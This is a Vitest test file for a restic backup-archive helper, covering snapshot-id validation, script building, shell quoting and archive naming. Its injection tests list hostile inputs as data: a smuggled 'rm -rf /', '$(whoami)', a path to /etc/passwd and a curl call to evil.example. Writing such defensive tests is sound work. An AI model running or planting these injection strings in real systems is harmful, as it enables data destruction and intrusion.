import { describe, expect, it } from "vitest";
import {
  buildArchiveFilename,
  buildArchiveScript,
  isValidSnapshotId,
  shellQuote
} from "./backup-archive";

describe("isValidSnapshotId", () => {
  it("accepts restic's short and full ids", () => {
    expect(isValidSnapshotId("d682f783")).toBe(true);
    expect(isValidSnapshotId("a".repeat(64))).toBe(true);
  });

  it("rejects anything that is not hex, so it cannot reach the host shell", () => {
    expect(isValidSnapshotId("d682f78")).toBe(false); // too short
    expect(isValidSnapshotId("d682f783; rm -rf /")).toBe(false);
    expect(isValidSnapshotId("$(whoami)")).toBe(false);
    expect(isValidSnapshotId("../../etc/passwd")).toBe(false);
    expect(isValidSnapshotId("")).toBe(false);
    expect(isValidSnapshotId(null)).toBe(false);
    expect(isValidSnapshotId(undefined)).toBe(false);
  });
});

describe("buildArchiveScript", () => {
  it("refuses to build a command for an id that is not hex", () => {
    expect(() => buildArchiveScript("d682f783; curl evil.example")).toThrow(/non-hex/i);
  });

  it("dumps the whole snapshot as a tar on stdout", () => {
    const script = buildArchiveScript("d682f783");
    expect(script).toContain("dump --archive tar 'd682f783' /");
    expect(script).toContain("exec /usr/bin/restic");
  });

  it("sends its only diagnostic to stderr, because stdout is the archive", () => {
    const script = buildArchiveScript("d682f783");
    const stdoutWrites = script
      .split("\n")
      .filter((line) => line.trim().startsWith("echo ") && !line.includes(">&2"));
    expect(stdoutWrites).toEqual([]);
    expect(script).toContain('echo "fail_no_b2_creds" >&2');
  });

  it("fails loudly when Backblaze credentials are absent rather than emitting an empty tar", () => {
    expect(buildArchiveScript("d682f783")).toContain("exit 3");
  });
});

describe("shellQuote", () => {
  it("neutralises an embedded single quote", () => {
    expect(shellQuote("a'b")).toBe(`'a'\\''b'`);
  });
});

describe("buildArchiveFilename", () => {
  it("names the archive for the site and the moment it was taken, in UTC", () => {
    expect(
      buildArchiveFilename({ siteSlug: "fucarino-com", startedAt: "2026-08-19T08:12:16.000Z" })
    ).toBe("fucarino-com-2026-08-19-08-12.tar");
  });

  it("falls back to the display name when there is no slug", () => {
    expect(
      buildArchiveFilename({ siteSlug: null, siteName: "Joyfeed App!", startedAt: "2026-08-19T09:12:15.000Z" })
    ).toBe("joyfeed-app-2026-08-19-09-12.tar");
  });

  it("never emits a filename built from an unusable date", () => {
    const name = buildArchiveFilename({ siteSlug: "site", startedAt: "not-a-date" });
    expect(name).toBe("site.tar");
    expect(name).not.toMatch(/nan/i);
  });

  it("still produces a usable name when the site has no printable label", () => {
    expect(buildArchiveFilename({ siteSlug: "!!!", startedAt: "2026-08-19T09:12:15.000Z" })).toBe(
      "backup-2026-08-19-09-12.tar"
    );
  });
});
